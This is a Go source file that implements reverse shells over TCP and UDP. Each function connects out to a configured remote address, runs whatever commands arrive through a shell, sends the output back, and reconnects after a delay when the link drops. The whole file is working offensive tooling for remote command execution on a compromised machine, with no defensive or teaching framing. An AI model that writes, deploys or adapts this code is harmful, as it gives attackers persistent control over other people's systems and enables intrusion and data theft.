package main

import (
	"net"
	"bufio"
	"time"
	// "log"
)

func TCPReverseShell(config Config) {
	conn, err := net.Dial("tcp", config.Address)
	if err != nil {
		if conn != nil {
			conn.Close()
		}

		TCPReconnect(config)
	}

	reader := bufio.NewReader(conn)
	for {
		stdin, err := reader.ReadBytes('\n')
		if err != nil {
			conn.Close()
			return
		}

		output := Shell(config.Shell, stdin)
		conn.Write(output)
	}

	TCPReconnect(config)
}

func TCPReconnect(config Config) {
	time.Sleep(config.Reconnect)
	TCPReverseShell(config)
}

func UDPReverseShell(config Config) {
	ServerAddr, err := net.ResolveUDPAddr("udp", config.Address)
	if err != nil {
		UDPReconnect(config)
	}

	LocalAddr, err := net.ResolveUDPAddr("udp", "127.0.0.1:0")
	if err != nil {
		UDPReconnect(config)
	}

	conn, err := net.DialUDP("udp", LocalAddr, ServerAddr)
	if err != nil {
		if conn != nil {
			conn.Close()
		}

		UDPReconnect(config)
	}

	reader := bufio.NewReader(conn)
	for {
		conn.Write([]byte("> "))

		conn.SetReadDeadline((time.Now()).Add(config.Reconnect)) // timeout then reconnect
		stdin, err := reader.ReadBytes('\n')
		if err != nil {
			conn.Write([]byte("Reconnecting...\n"))
			conn.Close()
			break
		}

		output := Shell(config.Shell, stdin)
		conn.Write(output)
	}
	
	UDPReconnect(config)
}

func UDPReconnect(config Config) {
	UDPReverseShell(config)
}